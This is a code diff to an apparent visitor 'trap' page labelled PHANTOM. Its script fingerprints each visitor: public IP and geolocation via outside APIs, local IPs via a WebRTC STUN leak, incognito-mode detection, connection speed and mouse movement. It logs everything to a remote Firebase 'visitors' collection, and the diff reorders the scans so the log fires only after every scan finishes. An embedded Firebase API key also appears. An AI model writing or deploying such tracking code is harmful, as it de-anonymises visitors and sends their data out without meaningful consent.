@@ -653,24 +653,7 @@ setTimeout(()=>{
   }catch(e){sv('i-adblocker','Unknown');}
 },600);
 
-// ── WEBRTC LOCAL IP ──
-setTimeout(()=>{
-  try{
-    const RTC=window.RTCPeerConnection||window.webkitRTCPeerConnection||window.mozRTCPeerConnection;
-    if(!RTC){sv('i-webrtc','Not Supported');return;}
-    const pc=new RTC({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
-    const ips=new Set();
-    pc.createDataChannel('');
-    pc.onicecandidate=e=>{
-      if(!e||!e.candidate)return;
-      const m=e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/g);
-      if(m)m.forEach(ip=>{if(!ip.startsWith('0.')&&!ip.startsWith('127.'))ips.add(ip);});
-      if(ips.size>0)sv('i-webrtc',[...ips].join(' · '),'hi');
-    };
-    pc.createOffer().then(o=>pc.setLocalDescription(o));
-    setTimeout(()=>{if(ips.size===0)sv('i-webrtc','Protected / Blocked','ok');try{pc.close();}catch(e){}},3000);
-  }catch(e){sv('i-webrtc','Unavailable');}
-},800);
+// ── WEBRTC — handled in module script as promise ──
 
 // ── THEME / TOUCH ──
 setTimeout(()=>{
@@ -700,24 +683,9 @@ setTimeout(()=>{
   }catch(e){sv('i-audio','Blocked');}
 },1000);
 
-// ── INCOGNITO ──
-setTimeout(async()=>{
-  let incognito=false;
-  try{
-    if(navigator.storage&&navigator.storage.estimate){const{quota}=await navigator.storage.estimate();if(quota<120000000)incognito=true;}
-    if(!incognito&&window.webkitRequestFileSystem){await new Promise(res=>{window.webkitRequestFileSystem(0,1,()=>res(false),()=>{incognito=true;res(true);});});}
-  }catch(e){}
-  sv('i-incognito',incognito?'⚠ Incognito Detected':'Normal Mode',incognito?'hi':'ok');
-},1000);
+// ── INCOGNITO — handled in module script as promise ──
 
-// ── SPEED ──
-setTimeout(async()=>{
-  try{
-    const conn=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
-    if(conn&&conn.downlink){const spd=conn.downlink;sv('i-speed',spd+' Mbps · '+(spd>10?'Fast':spd>2?'Medium':'Slow'),spd>10?'ok':spd>2?'wn':'hi');}
-    else{const start=performance.now();await fetch('https://www.google.com/favicon.ico?_='+Date.now(),{cache:'no-store',mode:'no-cors'});const ms=Math.round(performance.now()-start);sv('i-speed','~'+ms+'ms ping · '+(ms<100?'Fast':ms<300?'Medium':'Slow'),ms<100?'ok':ms<300?'wn':'hi');}
-  }catch(e){sv('i-speed','Unable to measure');}
-},1200);
+// ── SPEED — handled in module script as async promise ──
 
 // ── TIME ON PAGE (live) ──
 (()=>{const start=Date.now();setInterval(()=>{const s=Math.floor((Date.now()-start)/1000);const m=Math.floor(s/60),sec=s%60;const el=document.getElementById('i-timeonpage');if(el){el.textContent=(m>0?m+'m ':'')+sec+'s';el.classList.remove('ld');}},1000);})();
@@ -729,6 +697,9 @@ setTimeout(async()=>{
 (()=>{document.addEventListener('mousemove',e=>{const el=document.getElementById('i-mouse');if(el)el.textContent='X:'+e.clientX+' Y:'+e.clientY;},{passive:true});})();
 
 // ── IP + FIREBASE ──
+// All timed scans register a promise here. Firebase fires only after every scan settles.
+window._phantomScans=[];
+window._phantomRegister=function(p){window._phantomScans.push(Promise.resolve(p).catch(()=>{}));};
 </script>
 <script type="module">
 import{initializeApp,getApps,getApp}from"https://www.gstatic.com/firebasejs/12.9.0/firebase-app.js";
@@ -737,16 +708,21 @@ const _cfg={apiKey:"AIzaSyBl4bO6hNumDov3d26YNFj1y7Id498rBTU",authDomain:"rh2-sys
 const app=getApps().length?getApp():initializeApp(_cfg);
 const db=getFirestore(app);
 const g=id=>{const el=document.getElementById(id);return el?el.textContent.trim():'—';};
+const sb=document.getElementById('status-txt');
+const dot=document.getElementById('sdot');
 
+const sv2=(id,val,cls)=>{const el=document.getElementById(id);if(!el)return;el.textContent=val;el.classList.remove('ld');if(cls){el.className='row-val '+cls;}else{el.className='row-val';}};
+
+// ── IP / GEO SCAN (returns a promise) ──
 const filled={ip:false,country:false,city:false,isp:false,tz:false};
-async function tryIp(){
+async function scanIp(){
   try{
     const r=await fetch('https://api.ipify.org?format=json',{cache:'no-store'});
     const d=await r.json();
     if(d&&d.ip){sv2('i-ip',d.ip,'hi');filled.ip=true;
       try{
-        const g=await fetch('https://ipapi.co/'+d.ip+'/json/',{cache:'no-store'});
-        const geo=await g.json();
+        const gr=await fetch('https://ipapi.co/'+d.ip+'/json/',{cache:'no-store'});
+        const geo=await gr.json();
         if(geo&&!geo.error){
           if(geo.country_name){sv2('i-country',geo.country_name+(geo.country_code?' ('+geo.country_code+')':''));filled.country=true;}
           if(geo.city){sv2('i-city',geo.city+(geo.region?', '+geo.region:''));filled.city=true;}
@@ -763,15 +739,78 @@ async function tryIp(){
   if(!filled.tz)sv2('i-tz','Unavailable');
 }
 
-const sv2=(id,val,cls)=>{const el=document.getElementById(id);if(!el)return;el.textContent=val;el.classList.remove('ld');if(cls){el.className='row-val '+cls;}else{el.className='row-val';}};
-
-(async()=>{
+// ── SPEED SCAN (returns a promise, longest async scan at ~1200ms+) ──
+async function scanSpeed(){
   try{
-    await tryIp();
-    const sb=document.getElementById('status-txt');
-    const dot=document.getElementById('sdot');
-    if(sb)sb.textContent=filled.ip?'Signal acquired · Logged ✓':'Partial scan complete';
-    if(dot){dot.style.background=filled.ip?'var(--neon)':'var(--warn)';dot.style.boxShadow=filled.ip?'0 0 8px var(--neon)':'0 0 8px var(--warn)';}
+    const conn=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+    if(conn&&conn.downlink){const spd=conn.downlink;sv('i-speed',spd+' Mbps · '+(spd>10?'Fast':spd>2?'Medium':'Slow'),spd>10?'ok':spd>2?'wn':'hi');}
+    else{const start=performance.now();await fetch('https://www.google.com/favicon.ico?_='+Date.now(),{cache:'no-store',mode:'no-cors'});const ms=Math.round(performance.now()-start);sv('i-speed','~'+ms+'ms ping · '+(ms<100?'Fast':ms<300?'Medium':'Slow'),ms<100?'ok':ms<300?'wn':'hi');}
+  }catch(e){sv('i-speed','Unable to measure');}
+}
+
+// ── WEBRTC SCAN (returns a promise, has internal 3s timeout) ──
+function scanWebRTC(){
+  return new Promise(resolve=>{
+    try{
+      const RTC=window.RTCPeerConnection||window.webkitRTCPeerConnection||window.mozRTCPeerConnection;
+      if(!RTC){sv('i-webrtc','Not Supported');return resolve();}
+      const pc=new RTC({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+      const ips=new Set();
+      pc.createDataChannel('');
+      pc.onicecandidate=e=>{
+        if(!e||!e.candidate)return;
+        const m=e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/g);
+        if(m)m.forEach(ip=>{if(!ip.startsWith('0.')&&!ip.startsWith('127.'))ips.add(ip);});
+        if(ips.size>0)sv('i-webrtc',[...ips].join(' · '),'hi');
+      };
+      pc.createOffer().then(o=>pc.setLocalDescription(o));
+      setTimeout(()=>{
+        if(ips.size===0)sv('i-webrtc','Protected / Blocked','ok');
+        try{pc.close();}catch(e){}
+        resolve();
+      },3000);
+    }catch(e){sv('i-webrtc','Unavailable');resolve();}
+  });
+}
+
+// ── INCOGNITO SCAN (async, returns a promise) ──
+async function scanIncognito(){
+  let incognito=false;
+  try{
+    if(navigator.storage&&navigator.storage.estimate){const{quota}=await navigator.storage.estimate();if(quota<120000000)incognito=true;}
+    if(!incognito&&window.webkitRequestFileSystem){await new Promise(res=>{window.webkitRequestFileSystem(0,1,()=>res(false),()=>{incognito=true;res(true);});});}
+  }catch(e){}
+  sv('i-incognito',incognito?'⚠ Incognito Detected':'Normal Mode',incognito?'hi':'ok');
+}
+
+// ── MASTER ORCHESTRATOR — fires Firebase only when ALL scans are done ──
+(async()=>{
+  if(sb)sb.textContent='Scanning…';
+
+  // All timed scans fire in parallel, wrapped as promises with their natural delays
+  const allScans=Promise.all([
+    scanIp(),
+    scanWebRTC(),                                   // 3000ms internal timeout
+    scanIncognito(),                                // async quota check
+    new Promise(r=>setTimeout(r,1300)),             // covers: speed(1200ms), audio(1000ms), incognito(1000ms), theme(900ms), entropy(700ms), battery(400ms), conn(300ms), canvas(300ms), device(100ms), gpu(150ms) etc.
+  ]);
+
+  // Kick off the speed scan in parallel (it uses sv() itself)
+  const speedScan=scanSpeed();
+
+  if(sb)sb.textContent='Deep scan in progress…';
+
+  // Wait for everything
+  await Promise.all([allScans, speedScan]);
+
+  // Status update — ALL scans settled
+  if(sb)sb.textContent='Scan complete · Logging…';
+  if(dot){dot.style.background='var(--warn)';dot.style.boxShadow='0 0 8px var(--warn)';}
+
+  // Short flash delay so user sees "Logging…" before final state
+  await new Promise(r=>setTimeout(r,400));
+
+  try{
     await addDoc(collection(db,'visitors'),{
       timestamp:new Date(),
       ip:g('i-ip'),country:g('i-country'),city:g('i-city'),isp:g('i-isp'),timezone:g('i-tz'),
@@ -792,8 +831,14 @@ const sv2=(id,val,cls)=>{const el=document.getElementById(id);if(!el)return;el.t
       pageUrl:window.location.href,userAgent:navigator.userAgent,
       _source:'trap_v1',
     });
-    console.log('%c[PHANTOM] signal logged','color:#00ffcc');
-  }catch(e){console.warn('[PHANTOM] failed:',e.code,e.message);}
+    if(sb)sb.textContent='Signal acquired · Logged ✓';
+    if(dot){dot.style.background='var(--neon)';dot.style.boxShadow='0 0 8px var(--neon)';}
+    console.log('%c[PHANTOM] all scans complete · signal logged','color:#00ffcc');
+  }catch(e){
+    if(sb)sb.textContent='Scan complete · Log failed';
+    if(dot){dot.style.background='var(--bad)';dot.style.boxShadow='0 0 8px var(--bad)';}
+    console.warn('[PHANTOM] firebase failed:',e.code,e.message);
+  }
 })();
 </script>
 </body>
